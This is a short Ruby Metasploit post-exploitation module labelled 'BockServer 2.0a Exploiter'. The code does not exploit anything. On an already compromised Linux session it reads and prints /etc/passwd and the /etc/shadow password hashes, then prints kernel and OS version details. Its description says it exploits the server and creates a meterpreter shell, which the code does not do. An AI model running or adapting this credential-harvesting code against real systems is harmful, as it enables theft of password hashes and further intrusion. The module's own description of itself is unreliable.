require 'msf/core'

class MetasploitModule < Msf::Post
    include Msf::Post::File
    include Msf::Post::Linux::Priv
    include Msf::Post::Linux::System
    def initialize
        super(
            'Name'           => 'BockServer 2.0a Exploiter',
            'Description'    => 'This module can exploit BockServer 2.0a, creating a meterpreter shell.',
	    'Platform' => ['linux'],
	    #'Arch' => ARCH_LINUX,
	    'Targets' => [['automatic', {}],],
	    'DefaultTarget' => 0,
      'SessionTypes' => ['meterpreter', 'shell']
      )
    end
    
    def run
	begin
	    puts "The users are: "
	    puts read_file("/etc/passwd")
	    puts "The password hashes are"
    	    puts read_file("/etc/shadow")
	rescue
    	    print_status("could not print users/passwds")
	end	   
        begin 
	    sysinfo = get_sysinfo
    	    puts "The Kernel Version on the system is: #{sysinfo[:kernel]}"	    
	    puts "The OS Version is #{sysinfo[:distro]} #{sysinfo[:version]}"
	rescue
	    puts "There was an error loading the os info"
	end
    end
end
